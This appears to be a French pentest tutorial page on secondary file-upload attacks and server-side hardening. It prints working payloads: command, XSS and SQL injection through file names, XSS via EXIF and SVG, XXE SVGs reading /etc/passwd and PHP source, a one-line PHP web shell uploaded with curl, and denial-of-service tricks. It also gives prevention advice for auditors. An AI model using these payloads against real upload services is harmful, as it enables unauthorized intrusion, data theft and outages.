# Attaques avancées et prévention

Même quand l'upload de fichiers arbitraires est impossible, les fonctionnalités d'envoi de fichiers restent des surfaces d'attaque intéressantes. Un formulaire qui n'accepte que les images ou les documents peut tout de même servir de levier pour du XSS, de l'XXE ou du déni de service. Cette page couvre les vecteurs d'attaque secondaires liés à l'upload, puis détaille les mesures de durcissement à mettre en place côté serveur.

## Pourquoi

Sur un audit, il arrive souvent que les filtres d'upload résistent aux contournements classiques. Pourtant, un upload « sécurisé » qui accepte des SVG, du HTML ou des documents XML reste exploitable par d'autres biais. Par ailleurs, le nom du fichier lui-même peut devenir un vecteur d'injection si le serveur le manipule sans le nettoyer. Connaître ces attaques permet d'élargir la surface d'exploitation, tandis que comprendre la prévention aide à formuler des recommandations pertinentes dans un rapport de pentest.

## Comment ça marche

### Injection dans le nom de fichier

Si l'application utilise le nom du fichier uploadé dans une commande système (par exemple un `mv` ou un `cp`), on peut injecter du code directement dans ce nom.

**Injection de commandes OS :**

```bash
# - Noms de fichiers qui injectent la commande whoami
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

Le serveur qui exécute `mv file$(whoami).jpg /tmp/` va d'abord évaluer `$(whoami)`, puis utiliser le résultat dans le chemin. Le principe fonctionne avec n'importe quelle commande.

**XSS via le nom de fichier :**

Si l'application affiche le nom du fichier uploadé dans la page (liste de fichiers, historique d'uploads), un nom comme celui-ci déclenche du JavaScript :

```html
<script>alert(window.origin)</script>.jpg
```

**SQLi via le nom de fichier :**

Si le nom est inséré dans une requête SQL sans préparation :

```
file';SELECT SLEEP(5);--.jpg
```

{% hint style="warning" %}
Ces injections sont rarement testées par les développeurs, car le nom de fichier est perçu comme une donnée « contrôlée ». En réalité, c'est une entrée utilisateur comme une autre.
{% endhint %}

### Découverte du répertoire d'upload

Quand l'application ne renvoie pas le lien vers le fichier uploadé, il faut deviner ou forcer la révélation du répertoire de stockage.

**Méthodes courantes :**

| Technique | Principe |
|---|---|
| Fuzzing de répertoires | Tester `/uploads/`, `/files/`, `/media/`, `/attachments/` avec ffuf |
| Forcer une erreur | Uploader un fichier avec un nom déjà existant, ou un nom excessivement long (5000+ caractères) |
| Requêtes simultanées | Envoyer deux uploads identiques en même temps pour provoquer un conflit d'écriture |
| LFI / XXE | Lire le code source de la page d'upload pour extraire le chemin de destination |

{% hint style="success" %}
Les messages d'erreur sont souvent très bavards. Un conflit d'écriture peut révéler le chemin complet du fichier sur le serveur, y compris la racine web.
{% endhint %}

### Attaques spécifiques à Windows

Sur un serveur Windows, plusieurs particularités du système de fichiers peuvent être exploitées.

**Caractères réservés :**

Les caractères `|`, `<`, `>`, `*` et `?` sont réservés par Windows. Si le serveur ne les filtre pas, leur utilisation dans un nom de fichier peut provoquer des erreurs qui divulguent le chemin d'upload ou le comportement interne du serveur.

**Noms réservés :**

Windows interdit certains noms de fichiers hérités de DOS : `CON`, `COM1`, `LPT1`, `NUL`, `PRN`. Uploader un fichier avec l'un de ces noms provoque une erreur qui peut révéler des informations sur le serveur.

**Convention 8.3 :**

Les anciennes versions de Windows utilisaient une convention de nommage court avec le caractère tilde (`~`). Le fichier `hackthebox.txt` peut être référencé comme `HAC~1.TXT`. En uploadant un fichier nommé `WEB~1.CON`, on peut tenter d'écraser le fichier `web.conf` du serveur.

{% hint style="danger" %}
L'écrasement de fichiers de configuration via la convention 8.3 peut provoquer un déni de service ou exposer des informations sensibles. C'est une technique destructive à utiliser avec précaution en audit.
{% endhint %}

---

### Exploitation d'uploads limités

Même sans pouvoir uploader un web shell, certains types de fichiers autorisés ouvrent des vecteurs d'attaque.

#### XSS via fichiers HTML

Si l'application accepte les fichiers HTML, on peut y inclure du JavaScript malveillant. Le fichier sera servi depuis le domaine de l'application, ce qui permet un Stored XSS avec tous les privilèges associés (cookies, localStorage, API internes).

#### XSS via métadonnées d'image

Certaines applications affichent les métadonnées EXIF des images uploadées. On peut y injecter un payload XSS :

```bash
# - Injection XSS dans les métadonnées EXIF
exiftool -Comment='"><img src=1 onerror=alert(window.origin)>' image.jpg
```

```bash
# - Vérifier l'injection
exiftool image.jpg | grep Comment
# Comment : "><img src=1 onerror=alert(window.origin)>
```

Si l'application affiche le champ `Comment` sans échappement, le payload s'exécute.

#### XSS via SVG

Les fichiers SVG sont basés sur XML et peuvent contenir du JavaScript. Un fichier SVG malveillant :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

Le navigateur exécute le JavaScript quand il affiche le SVG, ce qui produit un Stored XSS.

#### XXE via SVG

Le format SVG étant du XML, il est aussi vulnérable aux attaques XXE. On peut lire des fichiers sur le serveur :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <text x="0" y="15">&xxe;</text>
</svg>
```

Pour lire du code source PHP (qui serait sinon interprété), on utilise le wrapper base64 :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM
  "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <text x="0" y="15">&xxe;</text>
</svg>
```

Le contenu encodé en base64 apparaît dans l'image SVG. Il suffit de le décoder pour obtenir le code source.

{% hint style="info" %}
L'XXE via SVG ne se limite pas aux images. Les fichiers PDF, Word (.docx) et PowerPoint (.pptx) contiennent aussi du XML interne. Si le serveur traite ces documents avec un parser XML vulnérable, les mêmes attaques s'appliquent.
{% endhint %}

#### Déni de service (DoS)

**Bombe de décompression (Zip Bomb) :**

Si le serveur décompresse automatiquement les archives uploadées, on peut créer une archive ZIP imbriquée qui se déploie en plusieurs pétaoctets de données. Le serveur tente de décompresser l'intégralité, sature son espace disque et crash.

**Pixel Flood :**

Pour les images JPG ou PNG qui utilisent de la compression, on peut créer une image de petite taille (500x500 pixels) puis modifier manuellement les données de compression pour indiquer une taille de `0xffff x 0xffff` (environ 4 gigapixels). Quand le serveur tente d'afficher ou de traiter cette image, il essaie d'allouer la mémoire correspondante et crash.

**Autres vecteurs de DoS :**

- Upload d'un fichier excessivement volumineux (si aucune limite côté serveur)
- Traversée de répertoire dans le nom du fichier (`../../../etc/passwd`) pour écraser des fichiers système
- Exploitation de bibliothèques de traitement vulnérables (ImageMagick, ffmpeg)

{% hint style="danger" %}
Les attaques DoS via upload sont destructives par nature. En audit, ne les utiliser que dans un environnement de test dédié, jamais en production sans accord explicite du client.
{% endhint %}

---

### Vulnérabilités dans les bibliothèques de traitement

Tout traitement automatique appliqué aux fichiers uploadés (redimensionnement, conversion, compression) peut introduire des vulnérabilités si la bibliothèque utilisée est vulnérable. Des exemples connus :

| Bibliothèque | Vulnérabilité | Impact |
|---|---|---|
| ImageMagick | CVE-2016-3714 (ImageTragick) | Exécution de commandes via des fichiers image spécialement construits |
| ffmpeg | XXE via fichiers AVI | Lecture de fichiers arbitraires sur le serveur |
| Ghostscript | Multiples CVE | Exécution de code via des fichiers PostScript/PDF |

Ces vulnérabilités sont régulièrement découvertes. Surveiller les CVE des bibliothèques de traitement d'images et de documents est une étape importante de la veille sécurité.

---

## En pratique

### Test d'injection dans le nom de fichier

Depuis un conteneur Exegol :

```bash
# - Tester l'injection de commandes via le nom de fichier
echo '<?php system($_GET["cmd"]); ?>' > 'shell$(whoami).php'

# - Uploader via cURL
curl -s -F "file=@shell\$(whoami).php" "http://<IP_CIBLE>:<PORT>/upload.php"
```

### Test XXE via SVG

```bash
# - Créer le SVG malveillant
cat > xxe.svg << 'PAYLOAD'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <text x="0" y="15">&xxe;</text>
</svg>
PAYLOAD

# - Uploader le SVG
curl -s -F "file=@xxe.svg" "http://<IP_CIBLE>:<PORT>/upload.php"

# - Visiter le fichier uploadé pour lire le contenu
curl -s "http://<IP_CIBLE>:<PORT>/uploads/xxe.svg"
```

### Test XSS via métadonnées

```bash
# - Injecter un payload XSS dans les métadonnées
exiftool -Comment='"><img src=1 onerror=alert(document.cookie)>' photo.jpg

# - Uploader l'image normalement via l'interface web
# - Vérifier si les métadonnées sont affichées dans la page
```

## Pièges et galères

{% tabs %}
{% tab title="Injection de nom" %}
- **Caractères échappés** : beaucoup de frameworks web échappent automatiquement les caractères spéciaux dans les noms de fichiers. L'injection de commandes via le nom ne fonctionne que si le serveur utilise le nom brut dans un appel système
- **Renommage automatique** : de plus en plus d'applications renomment les fichiers avec un UUID ou un hash. Dans ce cas, le nom original n'est jamais utilisé côté serveur
{% endtab %}
{% tab title="SVG / XXE" %}
- **Parser sécurisé** : les parsers XML modernes désactivent les entités externes par défaut. L'XXE via SVG nécessite un parser mal configuré
- **SVG rendu côté serveur** : si le SVG est converti en PNG côté serveur (via rsvg, Inkscape, etc.), le JavaScript ne s'exécutera pas, mais l'XXE reste possible lors du parsing XML
- **CSP stricte** : une Content Security Policy correctement configurée peut bloquer l'exécution du JavaScript dans les SVG uploadés
{% endtab %}
{% tab title="DoS" %}
- **Limites de taille** : la plupart des serveurs web et reverse proxies imposent une taille maximale de requête (par défaut 1 Mo pour Nginx, 2 Mo pour PHP). Les zip bombs doivent passer sous cette limite avant décompression
- **Timeout** : un serveur bien configuré interrompt les traitements trop longs, ce qui peut limiter l'impact d'un pixel flood
{% endtab %}
{% endtabs %}

## Retour terrain

En audit réel, les attaques par injection dans le nom de fichier sont rares car la plupart des frameworks modernes renomment les fichiers automatiquement. Cependant, les applications legacy ou développées sur mesure ne le font pas toujours.

Les attaques XSS et XXE via SVG se rencontrent plus fréquemment. Beaucoup d'applications acceptent les SVG pour les avatars ou les logos sans réaliser que le format est du XML exécutable. C'est un test rapide à effectuer et les résultats sont souvent positifs.

Pour la prévention, la recommandation la plus efficace est de ne jamais stocker les fichiers dans le répertoire web, de les renommer systématiquement, et de valider à toutes les couches (extension, Content-Type, magic bytes). Les erreurs d'implémentation sont courantes quand une seule couche de validation est en place.

---

## Prévention des attaques par upload

### Validation multicouche

Aucune validation unique ne suffit. Il faut combiner toutes les vérifications :

| Couche | Méthode | Limite si utilisée seule |
|---|---|---|
| Extension | Whitelist stricte (`.jpg`, `.png`, `.gif`) | Contournable via double extension ou caractères spéciaux |
| Content-Type | Vérifier le header HTTP | Entièrement contrôlé par le client |
| Magic bytes / MIME | Vérifier la signature du fichier | Contournable en ajoutant les bytes magiques au début du payload |
| Taille | Limiter la taille maximale côté serveur | Ne bloque pas les fichiers malveillants de petite taille |

### Stockage sécurisé

{% tabs %}
{% tab title="Hors DocumentRoot" %}
```bash
# - Stocker les fichiers en dehors du répertoire web
/var/www/html/          # - Racine web (pas ici)
/var/uploads/           # - Répertoire de stockage (ici)
```

Les fichiers sont servis via un script PHP ou un endpoint API qui contrôle l'accès, pas directement par le serveur web.
{% endtab %}
{% tab title="Stockage objet" %}
Utiliser un service de stockage externe (S3, GCS, Azure Blob) isole complètement les fichiers du serveur applicatif. Même si un fichier malveillant est uploadé, il ne peut pas être exécuté sur le serveur.
{% endtab %}
{% endtabs %}

### Renommage systématique

Ne jamais conserver le nom original du fichier. Utiliser un UUID ou un hash pour le stockage :

```php
// - Renommer le fichier avec un hash unique
$newName = bin2hex(random_bytes(16)) . '.' . $allowedExtension;
move_uploaded_file($tmpFile, "/var/uploads/" . $newName);
```

### Désactiver l'exécution dans le répertoire d'upload

{% tabs %}
{% tab title="Apache" %}
```apache
# - .htaccess dans le répertoire d'upload
php_flag engine off
AddHandler default-handler .php .phtml .phar
```
{% endtab %}
{% tab title="Nginx" %}
```nginx
# - Bloquer l'exécution PHP dans le répertoire d'upload
location /uploads/ {
    location ~ \.php$ {
        deny all;
    }
}
```
{% endtab %}
{% endtabs %}

### Mesures complémentaires

- **Limiter la taille des fichiers** côté serveur (`upload_max_filesize` en PHP, `client_max_body_size` en Nginx)
- **Scanner les fichiers** avec un antivirus (ClamAV) après upload
- **Désactiver les parsers XML externes** pour prévenir l'XXE (`libxml_disable_entity_loader(true)` en PHP)
- **Appliquer une CSP stricte** pour limiter l'exécution de scripts dans les fichiers uploadés

## Mémo express

| Vecteur | Payload / Technique | Prérequis |
|---|---|---|
| Injection OS dans le nom | `file$(cmd).jpg` | Nom utilisé dans un appel système |
| XSS dans le nom | `<script>alert(1)</script>.jpg` | Nom affiché sans échappement |
| XSS via métadonnées | `exiftool -Comment='payload' img.jpg` | Métadonnées affichées dans la page |
| XSS via SVG | `<script>` dans le XML SVG | SVG affiché dans le navigateur |
| XXE via SVG | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Parser XML avec entités externes |
| DoS Zip Bomb | Archives ZIP imbriquées | Décompression automatique côté serveur |
| DoS Pixel Flood | Taille compressée falsifiée (4 Gpx) | Traitement d'image côté serveur |
| Prévention | Whitelist + MIME + stockage externe + renommage | Configuration serveur |

***
